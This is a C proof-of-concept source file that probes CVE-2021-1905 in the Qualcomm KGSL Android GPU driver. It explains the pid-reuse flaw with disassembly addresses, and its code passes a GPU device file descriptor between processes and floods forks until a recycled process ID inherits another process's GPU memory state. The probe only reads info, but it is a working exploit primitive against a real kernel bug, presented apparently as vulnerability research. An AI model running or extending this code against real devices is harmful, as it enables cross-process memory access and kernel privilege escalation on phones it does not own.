/* CVE-2021-1905 (KGSL pid-number-reuse private confusion) — reachability probe.
 *
 * Deterministic (no race). Demonstrates the exact vulnerable primitive in our
 * binary: kgsl_process_private_new (inlined in kgsl_open, c05104d0..) matches a
 * new process to an existing private by bare tgid NUMBER:
 *      c0510500 ldr r1,[r5,#4] ; c0510504 cmp r1,r8   (private->pid == tgid)
 * so if process A's tgid number is recycled while A's private survives (its
 * kgsl fd held elsewhere), the new process INHERITS A's private: A's GPU
 * pagetable + mem_idr entries.
 *
 * Probe:
 *   1. child A: open /dev/kgsl-3d0, GPUMEM_ALLOC_ID -> {id,gpuaddr}; pass its
 *      fd to the parent (SCM_RIGHTS) so the private outlives A; A exits.
 *   2. parent: fork children until the kernel hands one A's recycled tgid;
 *      that child opens kgsl and does GPUMEM_GET_INFO(gpuaddr) -- success means
 *      it inherited A's private (id matches) => cross-process private confusion.
 *
 * No corruption: we only read info. Safe to repeat.
 * Build: zig cc -target arm-linux-musleabihf -static -O2 -w -Wl,--strip-all
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define KGSL_IOC_TYPE 0x09
struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpumem_get_info { unsigned long gpuaddr; unsigned int id, flags; size_t size, mmapsize; unsigned long useraddr; unsigned long __pad[4]; };
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_PMEM_GET_INFO _IOWR(KGSL_IOC_TYPE,0x36,struct kgsl_gpumem_get_info)
#define DEV "/dev/kgsl-3d0"

static int send_fd(int sock,int fd){
    char b[1]={'x'}; struct iovec iov={b,1}; char cb[CMSG_SPACE(sizeof(int))]; memset(cb,0,sizeof cb);
    struct msghdr m; memset(&m,0,sizeof m); m.msg_iov=&iov; m.msg_iovlen=1; m.msg_control=cb; m.msg_controllen=sizeof cb;
    struct cmsghdr*c=CMSG_FIRSTHDR(&m); c->cmsg_level=SOL_SOCKET; c->cmsg_type=SCM_RIGHTS; c->cmsg_len=CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(c),&fd,sizeof fd); return sendmsg(sock,&m,0)<0?-1:0;
}
static int recv_fd(int sock){
    char b[1]; struct iovec iov={b,1}; char cb[CMSG_SPACE(sizeof(int))]; memset(cb,0,sizeof cb);
    struct msghdr m; memset(&m,0,sizeof m); m.msg_iov=&iov; m.msg_iovlen=1; m.msg_control=cb; m.msg_controllen=sizeof cb;
    if(recvmsg(sock,&m,0)<0) return -1;
    for(struct cmsghdr*c=CMSG_FIRSTHDR(&m);c;c=CMSG_NXTHDR(&m,c))
      if(c->cmsg_level==SOL_SOCKET&&c->cmsg_type==SCM_RIGHTS){int fd;memcpy(&fd,CMSG_DATA(c),sizeof fd);return fd;}
    return -1;
}

static unsigned long g_gpuaddr=0; static unsigned g_memid=0;

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    printf("== kgsl 1905 pid-reuse inheritance probe (uid=%d) ==\n",(int)getuid());

    int sp[2]; if(socketpair(AF_UNIX,SOCK_DGRAM,0,sp)){perror("socketpair");return 1;}
    pid_t A=fork();
    if(A==0){
        close(sp[0]);
        int fd=open(DEV,O_RDWR);
        if(fd<0){ printf("A: open %s: %s\n",DEV,strerror(errno)); _exit(1); }
        struct kgsl_gpumem_alloc_id a; memset(&a,0,sizeof a); a.size=0x1000; a.flags=0;
        if(ioctl(fd,IOCTL_PMEM_ALLOC_ID,&a)<0){ printf("A: alloc: %s\n",strerror(errno)); _exit(1); }
        unsigned char info[64];
        snprintf((char*)info,sizeof info,"%lu %u",a.gpuaddr,a.id);
        send_fd(sp[1],fd);
        write(sp[1],info,strlen((char*)info));   /* pass gpuaddr+id textually */
        printf("A: pid=%d kgsl fd=%d id=%u gpuaddr=0x%lx\n",(int)getpid(),fd,a.id,a.gpuaddr);
        _exit(0);
    }
    close(sp[1]);
    int fd_A=recv_fd(sp[0]);
    char info[64]={0}; int n=read(sp[0],info,sizeof info-1); (void)n;
    if(fd_A<0){ printf("[-] no fd from A\n"); return 1; }
    sscanf(info,"%lu %u",&g_gpuaddr,&g_memid);
    printf("[*] A(pid=%d) private kept alive by parent fd=%d; target gpuaddr=0x%lx id=%u\n",
           (int)A, fd_A, g_gpuaddr, g_memid);

    /* sanity: parent (different tgid) holding fd_A sees A's mem entry */
    { struct kgsl_gpumem_get_info gi; memset(&gi,0,sizeof gi); gi.gpuaddr=g_gpuaddr;
      int r=ioctl(fd_A,IOCTL_PMEM_GET_INFO,&gi);
      printf("[*] via fd_A: GET_INFO -> %d id=%u (sanity)\n", r, gi.id); }

    int reap; while(waitpid(-1,&reap,WNOHANG)>0){}
    printf("[*] recycling pid %d via fork/flood...\n",(int)A);
    int hit=0; long forks=0, ffail=0;
    for(long i=0;i<200000 && !hit;i++){
        pid_t c=fork();
        if(c<0){ ffail++; if(ffail<=3) printf("[!] fork failed: %s\n",strerror(errno)); if(ffail>1000) break; usleep(1000); continue; }
        if(c==0){
            int fd=open(DEV,O_RDWR);
            if(fd>=0){
                struct kgsl_gpumem_get_info gi; memset(&gi,0,sizeof gi); gi.gpuaddr=g_gpuaddr;
                int r=ioctl(fd,IOCTL_PMEM_GET_INFO,&gi);
                if(r>=0 && gi.id==g_memid){
                    char out[96]; int k=snprintf(out,sizeof out,"[+] pid=%d INHERITED A's private: GET_INFO id=%u size=%zu\n",
                                                (int)getpid(),gi.id,gi.size);
                    write(1,out,k); _exit(42);
                }
                if((pid_t)getpid()==A){ char o[64]; int k=snprintf(o,sizeof o,"[!] pid=%d recycled but NOT inherited\n",(int)getpid()); write(1,o,k); }
                close(fd);
            }
            _exit(0);
        }
        forks++;
        int st;
        while(waitpid(-1,&st,WNOHANG)>0){
            if(WIFEXITED(st)&&WEXITSTATUS(st)==42) hit=1;
        }
        if((forks & 0x1fff)==0){ printf("... %ld forks, ffail=%ld current child pid=%d (target %d)\n",forks,ffail,(int)c,(int)A); }
    }
    while(waitpid(-1,&reap,0)>0){}
    printf("[*] done: forks=%ld inheritance=%s\n",forks, hit?"CONFIRMED":"not observed");
    printf("== done ==\n");
    return hit?0:2;
}
